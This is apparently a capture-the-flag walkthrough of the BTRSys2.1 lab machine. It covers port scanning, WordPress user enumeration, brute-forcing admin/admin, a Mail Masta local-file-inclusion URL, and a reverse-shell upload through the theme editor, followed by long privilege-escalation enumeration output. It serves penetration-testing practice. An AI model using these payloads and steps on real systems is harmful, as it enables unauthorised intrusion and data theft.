# BTRSys2.1

```
┌──(root㉿kali)-[~]
└─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.50 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 10:40 CST
Nmap scan report for 192.168.213.50
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.156
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 08eee3ff3120876c12e71caac4e754f2 (RSA)
|   256 ade11c7de78676be9aa8bdb968927787 (ECDSA)
|_  256 0ce1eb060c5cb5cc1bd1fa5606223167 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 4.4 (91%), Linux 3.16 (89%), Linux 3.13 (89%), Linux 3.10 - 3.16 (88%), Linux 3.10 - 3.12 (87%), Linux 2.6.32 (87%), Linux 3.2 - 3.8 (87%), Linux 3.8 (87%), WatchGuard Fireware 11.8 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   194.93 ms 192.168.45.1
2   194.99 ms 192.168.45.254
3   195.65 ms 192.168.251.1
4   195.80 ms 192.168.213.50

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.28 seconds

```

CMS使用了wordpress，枚举账户

```
wpscan --url http://192.168.213.50/wordpress --enumerate u
[+] btrisk
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

试下爆破密码

```
[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - admin / admin                                                         
All Found                                                                         
Progress Time: 00:00:46 <                     > (40 / 28688)  0.13%  ETA: ??:??:??
```

登陆进去后发现plugin Mail Masta

进行LFI漏洞利用读取flag,根据machine名猜测用户名为btrisk

```
http://192.168.213.50/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/btrisk/local.txt

```

正确的利用方式是wordpress，通过appearance-->>editor-->add reverse-shell.php,添加后访问http://host/wordpress/wp-content/themes/twentyfourteen/reverse-shell.php

获取shell

```
data@ubuntu:/var/www/html$ ./linpeas.sh
./linpeas.sh


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v3.1.5 - Safe OSCP by carlospolop
                                                                                  
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                
                                                                                  
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist                                                                
 LEGEND:                                                                          
  RED/YELLOW: 95% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════                                                                       
OS: Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: ubuntu
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)                                                                   
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                       
                                                                                  

Caching directories using 2 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE                                                                            
                                                                                  
════════════════════════════════════╣ System Information ╠════════════════════════════════════                                                                      
[+] Operative system                                                              
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits   
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.2 LTS
Release:        16.04
Codename:       xenial

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version      
Sudo version 1.8.16                                                               

[+] USBCreator
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                        
                                                                                  
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                      
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Wed May 17 22:57:01 PDT 2023                                                      

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                  
udev            479M     0  479M   0% /dev
tmpfs           100M  5.8M   94M   6% /run
/dev/sda1       8.8G  1.9G  6.5G  22% /
tmpfs           497M     0  497M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           497M     0  497M   0% /sys/fs/cgroup
              total        used        free      shared  buff/cache   available
Mem:        1016000      280644      289420       34016      445936      499588
Swap:       1046524           0     1046524

[+] CPU info
Architecture:          x86_64                                                     
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                2
On-line CPU(s) list:   0,1
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             2
NUMA node(s):          1
Vendor ID:             AuthenticAMD
CPU family:            23
Model:                 1
Model name:            AMD EPYC 7371 16-Core Processor
Stepping:              2
CPU MHz:               3094.187
BogoMIPS:              6188.37
Hypervisor vendor:     VMware
Virtualization type:   full
L1d cache:             32K
L1i cache:             64K
L2 cache:              512K
L3 cache:              65536K
NUMA node0 CPU(s):     0,1
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc extd_apicid eagerfpu pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xgetbv1 clzero arat

[+] Environment
[i] Any private information inside environment variables?                         
HISTFILESIZE=0                                                                    
SHLVL=1
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                 
 Not Found                                                                        
                                                                                  
[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found                                
[+] Execshield enabled? ............ Execshield Not Found                         
[+] SELinux enabled? ............... sestatus Not Found                           
[+] Is ASLR enabled? ............... Yes                                          
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (vmware)                                 
[+] Is this a container? ........... No
[+] Any running containers? ........ No                                           
                                                                                  

═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════                                                                      
[+] Any sd*/disk* disk in /dev? (limit 20)                                        
disk                                                                              
sda
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                       
UUID=91864e47-b735-4e83-959f-1bfd9e7fe8fc /               ext4    errors=remount-ro 0       1
UUID=5e7afb81-0cc6-4b05-815b-ae99afde252e none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0


════════════════════════════════════╣ Available Software ╠════════════════════════════════════                                                                      
[+] Useful software                                                               
/bin/nc                                                                           
/bin/netcat
/usr/bin/wget
/bin/ping
/usr/bin/base64
/usr/bin/python3
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

[+] Installed Compiler
/usr/share/gcc-5                                                                  


══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════                                                       
[+] Cleaned processes                                                             
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                            
root         1  0.0  0.5  37840  5812 ?        Ss   22:23   0:00 /sbin/init noprompt
root       257  0.0  0.2  28356  2808 ?        Ss   22:23   0:00 /lib/systemd/systemd-journald
root       301  0.0  0.4  45420  5004 ?        Ss   22:23   0:00 /lib/systemd/systemd-udevd
root       316  0.0  1.0 194444 10636 ?        Ssl  22:23   0:00 /usr/bin/vmtoolsd
systemd+   385  0.0  0.2 100324  2568 ?        Ssl  22:23   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       523  0.0  0.8 275760  8304 ?        Ssl  22:23   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       525  0.0  0.9  85436  9360 ?        Ss   22:23   0:00 /usr/bin/VGAuthService                                                                             
root       526  0.0  0.1  20100  1168 ?        Ss   22:23   0:00 /lib/systemd/systemd-logind
root       540  0.0  0.2  29008  2872 ?        Ss   22:23   0:00 /usr/sbin/cron -f
syslog     543  0.0  0.3 256396  3264 ?        Ssl  22:23   0:00 /usr/sbin/rsyslogd -n
message+   545  0.0  0.3  42904  3856 ?        Ss   22:23   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation         
  └─(Caps) 0x0000000020000000=cap_audit_write
root       744  0.0  0.2  19620  2144 ?        Ss   22:23   0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid
root       750  0.0  0.5  65520  5220 ?        Ss   22:23   0:00 /usr/sbin/sshd -D
root       767  0.0  0.2  24044  2448 ?        Ss   22:23   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       788  0.0  0.1  15940  1748 tty1     Ss+  22:23   0:00 /sbin/agetty --noclear tty1 linux
mysql      795  0.0 16.9 1367856 172560 ?      Ssl  22:23   0:00 /usr/sbin/mysqld
root       855  0.0  3.1 395752 32172 ?        Ss   22:23   0:00 /usr/sbin/apache2 -k start
www-data   874  0.0  3.6 474848 36892 ?        S    22:23   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1310  0.0  0.0   4508   708 ?        S    22:43   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i
www-data  1314  0.0  0.0   4508   712 ?        S    22:43   0:00  |       _ /bin/sh -i
www-data  1321  0.0  0.8  35828  8336 ?        S    22:44   0:00  |           _ python3 -c import pty; pty.spawn ("/bin/bash")
www-data  1322  0.0  0.3  18228  3280 pts/0    Ss   22:44   0:00  |               _ /bin/bash
www-data  1364  1.0  0.1   4712  1976 pts/0    S+   22:56   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  2043  0.0  0.0   4712   436 pts/0    S+   22:57   0:00  |                       _ /bin/sh ./linpeas.sh
www-data  2047  0.0  0.3  34556  3060 pts/0    R+   22:57   0:00  |                       |   _ ps fauxwww
www-data  2046  0.0  0.0   4712   436 pts/0    S+   22:57   0:00  |                       _ /bin/sh ./linpeas.sh
www-data   876  0.0  3.4 472552 34732 ?        S    22:23   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1210  0.0  2.3 396540 24260 ?        S    22:28   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1211  0.0  3.5 474740 36056 ?        S    22:28   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1212  0.0  3.4 474544 35404 ?        S    22:28   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1215  0.0  2.6 396768 27032 ?        S    22:28   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1218  0.0  3.5 474772 36080 ?        S    22:28   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1240  0.0  2.3 396516 24096 ?        S    22:35   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1241  0.0  2.3 396516 24248 ?        S    22:36   0:00  _ /usr/sbin/apache2 -k start                                                                      
www-data  1242  0.0  2.3 396516 24184 ?        S    22:36   0:00  _ /usr/sbin/apache2 -k start                                                                      
root       877  0.0  3.1 358400 32408 ?        Ss   22:23   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data   881  0.0  0.7 358400  8064 ?        S    22:23   0:00  _ php-fpm: pool www
www-data   882  0.0  0.7 358400  8064 ?        S    22:23   0:00  _ php-fpm: pool www

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes         
-rwxr-xr-x 1 root root  1037528 Jun 24  2016 /bin/bash                            
lrwxrwxrwx 1 root root        4 Mar 17  2017 /bin/sh -> dash
-rwxr-xr-x 1 root root   326224 Jan 18  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   618520 Jan 18  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   141904 Jan 18  2017 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   453240 Jan 18  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    44104 Dec 16  2016 /sbin/agetty
lrwxrwxrwx 1 root root       20 Mar 17  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   123232 May  8  2018 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root   224208 Jan 12  2017 /usr/bin/dbus-daemon[0m
-rwxr-xr-x 1 root root    48688 May  8  2018 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon[0m                                                                            
-rwxr-xr-x 1 root root   646080 Jul 15  2016 /usr/sbin/apache2
-rwxr-xr-x 1 root root    44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root    48440 Apr 11  2016 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root 24803144 Jan 18  2017 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   799216 Aug 11  2016 /usr/sbin/sshd
-rwxr-xr-x 1 root root   168200 Apr 13  2016 /usr/sbin/vsftpd

[+] Files opened by processes belonging to other users
[i] This is usually empty because of the lack of privileges to read other user processes information                                                                
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                     
gdm-password Not Found                                                            
gnome-keyring-daemon Not Found                                                    
lightdm Not Found                                                                 
vsftpd process found (dump creds from memory as root)                             
apache2 process found (dump creds from memory as root)
sshd Not Found
                                                                                  
[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                 
/usr/bin/crontab                                                                  
incrontab Not Found
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab                             

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Mar 17  2017 .
drwxr-xr-x 90 root root 4096 Mar  6  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  190 Mar 17  2017 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Mar 17  2017 .
drwxr-xr-x 90 root root 4096 Mar  6  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar 17  2017 .
drwxr-xr-x 90 root root 4096 Mar  6  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar 17  2017 .
drwxr-xr-x 90 root root 4096 Mar  6  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Mar 17  2017 .
drwxr-xr-x 90 root root 4096 Mar  6  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Services
[i] Search for outdated versions                                                  
 [ + ]  apache-htcacheclean                                                       
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ + ]  console-setup
 [ + ]  cron
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hostname.sh
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  keyboard-setup
 [ - ]  killprocs
 [ + ]  kmod
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  mysql
 [ + ]  networking
 [ + ]  ondemand
 [ + ]  open-vm-tools
 [ + ]  php7.0-fpm
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rc.local
 [ + ]  resolvconf
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  sendsigs
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ + ]  urandom
 [ - ]  uuidd
 [ + ]  vsftpd
 [ - ]  x11-common

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                         
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                 

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services          
/lib/systemd/system/emergency.service is executing some relative path             
/lib/systemd/system/networking.service is executing some relative path
/lib/systemd/system/rescue.service is executing some relative path
You can't write on systemd PATH

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers            
NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
Thu 2023-05-18 13:10:01 PDT  14h left Wed 2023-05-17 22:26:18 PDT  30min ago apt-daily.timer              apt-daily.service                                         
Thu 2023-05-18 22:38:55 PDT  23h left Wed 2023-05-17 22:38:55 PDT  18min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                            
n/a                          n/a      n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service                                   

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers            
                                                                                  
[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets           
                                                                                  
[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets           
                                                                                  
[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus             
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus             
NAME                               PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                               526 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
:1.1                                 1 systemd         root             :1.1          init.scope                -          -                  
:1.136                            7018 busctl          www-data         :1.136        apache2.service           -          -                  
:1.2                               523 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
com.ubuntu.LanguageSelector          - -               -                (activatable) -                         -         
org.freedesktop.Accounts           523 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
org.freedesktop.DBus               545 dbus-daemon     messagebus       org.freedesktop.DBus dbus.service              -          -                                 
org.freedesktop.hostname1            - -               -                (activatable) -                         -         
org.freedesktop.locale1              - -               -                (activatable) -                         -         
org.freedesktop.login1             526 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
org.freedesktop.network1             - -               -                (activatable) -                         -         
org.freedesktop.resolve1             - -               -                (activatable) -                         -         
org.freedesktop.systemd1             1 systemd         root             :1.1          init.scope                -          -                  
org.freedesktop.timedate1            - -               -                (activatable) -                         -         


═══════════════════════════════════╣ Network Information ╠════════════════════════════════════                                                                      
[+] Hostname, hosts and DNS                                                       
ubuntu                                                                            
127.0.0.1       localhost
127.0.1.1       ubuntu

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 192.168.195.254

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found                                                         
                                                                                  
[+] Interfaces
# symbolic names for networks, see networks(5) for more information               
link-local 169.254.0.0
ens160    Link encap:Ethernet  HWaddr 00:50:56:ba:73:59  
          inet addr:192.168.195.50  Bcast:192.168.195.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feba:7359/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2122 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1742 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:576601 (576.6 KB)  TX bytes:1771470 (1.7 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:248 errors:0 dropped:0 overruns:0 frame:0
          TX packets:248 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:20016 (20.0 KB)  TX bytes:20016 (20.0 KB)


[+] Networks and neighbours
Kernel IP routing table                                                           
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         192.168.195.254 0.0.0.0         UG    0      0        0 ens160
192.168.195.0   *               255.255.255.0   U     0      0        0 ens160
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.195.254          ether   00:50:56:ba:f3:39   C                     ens160

[+] Iptables rules
iptables rules Not Found                                                          
                                                                                  
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports        
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

[+] Can I sniff with tcpdump?
No                                                                                
                                                                                  

════════════════════════════════════╣ Users Information ╠════════════════════════════════════                                                                       
[+] My user                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users             
uid=33(www-data) gid=33(www-data) groups=33(www-data)                             

[+] Do I have PGP keys?
/usr/bin/gpg                                                                      
netpgpkeys Not Found
netpgp Not Found                                                                  
                                                                                  
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                          
                                                                                  
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
                                                                                  
[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                                 
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                             
gdb wasn't found in PATH

[+] Checking doas.conf
/etc/doas.conf Not Found                                                          
                                                                                  
[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                             
                                                                                  
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                   

[+] Users with console
btrisk:x:1000:1000:Ubuntu,,,:/home/btrisk:/bin/bash                               
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)                                            
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(btrisk) gid=1000 groups=1000,4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)                                                    
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
